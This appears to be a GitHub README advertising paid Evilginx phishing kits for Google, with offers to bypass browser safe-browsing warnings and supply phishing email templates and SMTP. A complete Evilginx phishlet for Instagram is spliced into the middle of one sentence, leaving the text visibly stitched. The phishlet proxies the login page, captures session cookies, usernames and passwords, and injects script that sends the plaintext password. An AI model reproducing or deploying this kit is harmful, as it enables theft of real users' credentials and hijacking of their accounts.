# Google Phishlet Evilginx
RED TEAM ATTACK WITH EVILGINX AND GOOGLE PHISHLET

If Ud need Google Phishlet send me a message in telegram @PSDT707

Phishlet only sell, not free.

Conctact me, only if u have resources for buy in USDT, BTC, ETH, DGB..

----------------------------------------------------------------------------------------------------------------------------------------
                                                 EVILGINX MASTERY COURSE (OFFICIAL)

![evilginx-mastery-box-image](https://github.com/Dazmed707/Google-Phishlet-Evilginx/assets/35184132/eee6bf77-a6f0-4203-ba65-781bafd74df9)

BYPASS SAFE BROWSER (RED SCREEN) AVAILABLE

<img width="512" alt="image" src="https://github.com/Dazmed707/Google-Phishlet-Evilginx/assets/35184132/6ecb9ad2-85b3-4109-b345-7611fb1c0619">


GOPHISH HELP INSTALL AVAILABLE (MOD FEATURES FOR PRauthor: '@charlesbel'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
  - {phish_sub: 'm', orig_sub: 'm', domain: 'instagram.com', session: true, is_landing: false}
sub_filters:
  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
auth_tokens:
  - domain: '.instagram.com'
    keys: ['sessionid','.*,regexp']
credentials:
  username:
    key: 'user'
    search: '(.*)'
    type: 'post'
  password:
    key: 'unenc_password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'www.instagram.com'
  path: '/accounts/login'
js_inject:
  - trigger_domains: ["www.instagram.com"]
    trigger_paths: ["/accounts/login"]
    trigger_params: []
    script: |
      function lp(){
        var submit = document.querySelectorAll('button[type=submit]')[0];
        submit.setAttribute("onclick", "sendPass()");
        return;
      }
      function sendPass(){
        var password = document.getElementsByName("password")[0].value;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", '/accounts/login/ajax/', true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("unenc_password="+encodeURIComponent(password));
        return;
      }
      setTimeout(function(){ lp(); }, 1000);PROTECT INSTANCE)

EVILGOPHISH WITH EVILGINX 3.2 AVAILABLE

SMTP FOR GOPHISH AVAILABLE

TEMPLATE FOR SEND EMAIL, GOOGLE, OUTLOOK, YAHOO ETC, AVAILABLE
